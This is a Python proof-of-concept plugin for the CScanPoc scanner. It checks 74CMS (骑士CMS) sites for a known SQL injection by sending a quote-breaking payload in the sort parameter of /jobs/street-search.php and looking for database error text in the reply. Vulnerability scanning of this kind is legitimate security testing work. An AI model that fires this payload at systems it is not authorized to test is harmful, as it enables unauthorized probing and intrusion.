# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '74CMS_0001'  # 平台漏洞编号，留空
    name = '骑士CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-05'  # 漏洞公布时间
    desc = '''
        骑士CMS /jobs/street-search.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '18ce2a69-1638-4dfa-b38c-0ad34910f9d5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/jobs/street-search.php?sort=wage%3Edesc%27&page=1&streetid=&inforow="
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200:
                if 'Error' in req.text and 'ORDER BY' in req.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name,url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
